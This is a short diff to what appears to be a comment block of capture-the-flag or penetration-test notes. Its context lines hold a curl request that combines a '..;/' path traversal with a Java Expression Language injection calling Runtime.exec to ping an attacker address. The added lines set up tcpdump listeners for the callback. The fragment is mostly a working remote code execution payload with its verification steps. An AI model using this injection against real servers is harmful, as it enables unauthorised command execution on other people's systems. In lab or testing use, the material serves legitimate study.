@@ -43,6 +43,9 @@ ${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invok
 curl 'http://10.10.14.34/maintenance/..;/login.jsp/pwn${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null).exec("ping 10.10.14.6", null).waitFor()}.xhtml'
 
 //sudo tcpdump -ni tun0 icmp
+sudo tcpdump -ni tun0 icmp -w capture.pcap
+sudo tcpdump -ni tun0 tcp port 5001
+sudo tcpdump -ni tun0 udp port 5001
 
 
 */
